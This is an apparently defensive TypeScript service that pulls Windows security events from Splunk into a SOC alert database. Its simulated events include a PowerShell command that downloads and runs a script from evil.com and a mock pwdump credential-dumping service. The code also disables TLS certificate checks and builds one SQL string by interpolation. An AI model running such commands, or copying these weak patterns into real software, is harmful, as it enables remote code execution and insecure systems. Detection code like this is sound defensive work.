import axios, { AxiosInstance } from 'axios';
import https from 'https';
import { env } from '../../config/env';
import { logger } from '../../config/logger';
import { SplunkEvent, SplunkSearchOptions, SplunkPaginatedResult } from './splunk.types';
import { EVENT_ID_DESCRIPTIONS, SPLUNK_QUERIES } from './splunk.constants';
import { AlertService } from '../../modules/alerts/alert.service';
import { CreateAlertDto } from '../../modules/alerts/alert.model';

export class SplunkService {
  private client: AxiosInstance;
  private alertService: AlertService;

  constructor() {
    this.alertService = new AlertService();
    
    const baseURL = env.SPLUNK_URL || `https://${env.SPLUNK_HOST}:${env.SPLUNK_PORT}`;
    const authHeader = env.SPLUNK_TOKEN 
      ? `Bearer ${env.SPLUNK_TOKEN}`
      : `Basic ${Buffer.from(`${env.SPLUNK_USERNAME}:${env.SPLUNK_PASSWORD}`).toString('base64')}`;

    this.client = axios.create({
      baseURL,
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      // Disable SSL verification for local self-signed Splunk certs
      httpsAgent: new https.Agent({
        rejectUnauthorized: false
      }),
      timeout: 15000 // 15s timeout
    });
  }

  private async retryRequest<T>(fn: () => Promise<T>, retries = 3, delay = 1000): Promise<T> {
    try {
      return await fn();
    } catch (error) {
      if (retries <= 0) throw error;
      logger.warn({ retriesLeft: retries, error: error instanceof Error ? error.message : String(error) }, 'splunk: request failed, retrying...');
      await new Promise(resolve => setTimeout(resolve, delay));
      return this.retryRequest(fn, retries - 1, delay * 2);
    }
  }

  async searchEvents(queryText: string, options?: SplunkSearchOptions): Promise<SplunkPaginatedResult<SplunkEvent>> {
    const limit = options?.limit || 20;
    const offset = options?.offset || 0;
    const earliest = options?.earliestTime || '-24h';
    const latest = options?.latestTime || 'now';

    // Construct form body
    const params = new URLSearchParams();
    params.append('search', queryText);
    params.append('exec_mode', 'oneshot');
    params.append('output_mode', 'json');
    params.append('earliest_time', earliest);
    params.append('latest_time', latest);
    params.append('count', limit.toString());
    params.append('offset', offset.toString());

    logger.info({ query: queryText, limit, offset }, 'splunk: executing search');

    try {
      const response = await this.retryRequest(async () => {
        return this.client.post('/services/search/jobs', params.toString());
      });

      const results = response.data.results || [];
      const mappedEvents: SplunkEvent[] = results.map((row: any) => this.mapRowToSplunkEvent(row));

      return {
        results: mappedEvents,
        count: mappedEvents.length,
        offset
      };
    } catch (error: any) {
      logger.error({ error: error.message, status: error.response?.status }, 'splunk: search execution failed');
      
      // Fallback to simulate events if simulation mode is enabled
      if (env.SPLUNK_SIMULATION_MODE) {
        logger.warn('splunk: connection failed, falling back to simulated events (SPLUNK_SIMULATION_MODE is true)');
        const simulated = this.generateSimulatedEvents(queryText, limit, offset);
        return {
          results: simulated,
          count: simulated.length,
          offset
        };
      }
      
      throw error;
    }
  }

  async getRecentEvents(limit?: number): Promise<SplunkEvent[]> {
    const res = await this.searchEvents(SPLUNK_QUERIES.RECENT_EVENTS, { limit });
    return res.results;
  }

  async getBruteForceEvents(limit?: number): Promise<SplunkEvent[]> {
    const res = await this.searchEvents(SPLUNK_QUERIES.BRUTE_FORCE, { limit });
    return res.results;
  }

  async getPrivilegeEscalationEvents(limit?: number): Promise<SplunkEvent[]> {
    const res = await this.searchEvents(SPLUNK_QUERIES.PRIVILEGE_ESCALATION, { limit });
    return res.results;
  }

  async getPowerShellEvents(limit?: number): Promise<SplunkEvent[]> {
    const res = await this.searchEvents(SPLUNK_QUERIES.POWERSHELL, { limit });
    return res.results;
  }

  /**
   * Ingests Splunk security events into the local Alerts module database
   */
  async ingestEventsAsAlerts(events: SplunkEvent[]): Promise<void> {
    logger.info({ count: events.length }, 'splunk: ingesting events as alerts');
    for (const event of events) {
      try {
        const severity = this.mapEventCodeToSeverity(event.eventCode);
        const alertDto: CreateAlertDto = {
          title: `Splunk: ${event.eventCodeDescription}`,
          description: `Event Code ${event.eventCode} detected on host ${event.host}. Source: ${event.source}`,
          severity,
          status: 'new',
          source: 'splunk',
          externalId: event.fields._cd || `splunk-${event.time}-${event.host}-${event.eventCode}`,
          sourceRuleId: event.eventCode,
          sourceRuleName: event.eventCodeDescription,
          rawEvent: event.fields,
          tags: ['splunk', `event-${event.eventCode}`, event.sourcetype],
          firedAt: event.time
        };
        await this.alertService.createAlert(alertDto);
      } catch (err: any) {
        // Skip duplicate unique constraint issues
        if (err.code === '23505') continue;
        logger.error({ err: err.message, event }, 'splunk: failed to ingest event as alert');
      }
    }
  }

  private mapRowToSplunkEvent(row: any): SplunkEvent {
    const eventCode = row.EventCode || row.EventID || 'unknown';
    const desc = EVENT_ID_DESCRIPTIONS[eventCode] || 'Unknown Windows Security Event';
    
    return {
      time: row._time || new Date().toISOString(),
      raw: row._raw || '',
      host: row.host || 'unknown',
      source: row.source || 'splunk',
      sourcetype: row.sourcetype || 'splunk_event',
      eventCode,
      eventCodeDescription: desc,
      user: row.user || row.TargetUserName || 'unknown',
      srcIp: row.src_ip || row.IpAddress || undefined,
      destIp: row.dest_ip || undefined,
      processName: row.process_name || row.NewProcessName || undefined,
      commandLine: row.command_line || row.CommandLine || undefined,
      fields: row
    };
  }

  private mapEventCodeToSeverity(code: string): 'info' | 'low' | 'medium' | 'high' | 'critical' {
    switch (code) {
      case '4624': // Success logon
      case '4688': // Process create
        return 'info';
      case '4625': // Failed logon
        return 'low';
      case '4672': // Special privilege
      case '4740': // Account lockout
        return 'medium';
      case '4720': // User created
        return 'high';
      case '4728': // Group added
      case '7045': // Service installed
        return 'critical';
      default:
        return 'medium';
    }
  }

  private generateSimulatedEvents(queryText: string, limit: number, offset: number): SplunkEvent[] {
    const mockDb: SplunkEvent[] = [
      {
        time: new Date(Date.now() - 5 * 60000).toISOString(),
        raw: "Security: An account failed to log on. TargetUserName: administrator. Status: 0xC000006D.",
        host: "win-prod-dc01",
        source: "WinEventLog:Security",
        sourcetype: "WinEventLog:Security",
        eventCode: "4625",
        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4625"] || "An account failed to log on",
        user: "administrator",
        srcIp: "10.0.12.85",
        fields: { EventCode: "4625", TargetUserName: "administrator", IpAddress: "10.0.12.85", host: "win-prod-dc01" }
      },
      {
        time: new Date(Date.now() - 15 * 60000).toISOString(),
        raw: "Security: A member was added to a security-enabled global group. MemberName: CN=jdoe,OU=Users. GroupName: Domain Admins.",
        host: "win-prod-dc01",
        source: "WinEventLog:Security",
        sourcetype: "WinEventLog:Security",
        eventCode: "4728",
        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4728"] || "A member was added to a security-enabled global group",
        user: "jdoe",
        fields: { EventCode: "4728", TargetUserName: "Domain Admins", MemberName: "jdoe", host: "win-prod-dc01" }
      },
      {
        time: new Date(Date.now() - 30 * 60000).toISOString(),
        raw: "Security: A service was installed in the system. Service Name: PwDumpSvc. Service File Name: C:\\Windows\\Temp\\pwdump.exe",
        host: "win-prod-srv02",
        source: "WinEventLog:System",
        sourcetype: "WinEventLog:System",
        eventCode: "7045",
        eventCodeDescription: EVENT_ID_DESCRIPTIONS["7045"] || "A service was installed in the system",
        user: "SYSTEM",
        fields: { EventCode: "7045", ServiceName: "PwDumpSvc", ImagePath: "C:\\Windows\\Temp\\pwdump.exe", host: "win-prod-srv02" }
      },
      {
        time: new Date(Date.now() - 45 * 60000).toISOString(),
        raw: "Security: A new process has been created. NewProcessName: C:\\Windows\\System32\\powershell.exe. CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')",
        host: "win-workstation-05",
        source: "WinEventLog:Security",
        sourcetype: "WinEventLog:Security",
        eventCode: "4688",
        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4688"] || "A new process has been created",
        user: "local_admin",
        processName: "C:\\Windows\\System32\\powershell.exe",
        commandLine: "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')",
        fields: { EventCode: "4688", NewProcessName: "C:\\Windows\\System32\\powershell.exe", CommandLine: "powershell.exe ...", host: "win-workstation-05" }
      },
      {
        time: new Date(Date.now() - 60 * 60000).toISOString(),
        raw: "Security: An account was successfully logged on. TargetUserName: system_admin.",
        host: "win-prod-dc01",
        source: "WinEventLog:Security",
        sourcetype: "WinEventLog:Security",
        eventCode: "4624",
        eventCodeDescription: EVENT_ID_DESCRIPTIONS["4624"] || "An account was successfully logged on",
        user: "system_admin",
        srcIp: "10.0.1.200",
        fields: { EventCode: "4624", TargetUserName: "system_admin", IpAddress: "10.0.1.200", host: "win-prod-dc01" }
      }
    ];

    // Simple filtering based on query text
    let filtered = mockDb;
    if (queryText.includes("4625")) {
      filtered = mockDb.filter(e => e.eventCode === "4625");
    } else if (queryText.includes("4688")) {
      filtered = mockDb.filter(e => e.eventCode === "4688");
    } else if (queryText.includes("4672") || queryText.includes("4728")) {
      filtered = mockDb.filter(e => e.eventCode === "4672" || e.eventCode === "4728");
    }

    return filtered.slice(offset, offset + limit);
  }

  async getAlertVolume(earliest = '-24h'): Promise<any[]> {
    const q = `search index=${env.SPLUNK_INDEX || 'soc'} | bucket _time span=1h | stats count by _time | sort _time`;
    const res = await this.searchEvents(q, { earliestTime: earliest, limit: 1000 });
    return res.results.map((row: any) => ({
      hour: row.fields?._time || row.time,
      count: parseInt(row.fields?.count || '0', 10)
    }));
  }

  async getTopAttackingIps(limit = 10): Promise<any[]> {
    const q = `search index=${env.SPLUNK_INDEX || 'soc'} src_ip=* | stats count by src_ip | sort -count`;
    const res = await this.searchEvents(q, { limit });
    return res.results.map((row: any) => ({
      ip: row.fields?.src_ip || row.srcIp || 'unknown',
      count: parseInt(row.fields?.count || '0', 10)
    }));
  }

  async pruneOldAlerts(days = 30): Promise<number> {
    logger.info({ days }, 'splunk: pruning old alerts from database');
    const deleteSql = `
      DELETE FROM alerts
      WHERE fired_at < now() - interval '${days} days'
    `;
    const { query } = await import('../../config/database');
    const res = await query(deleteSql);
    return res.rowCount || 0;
  }
}
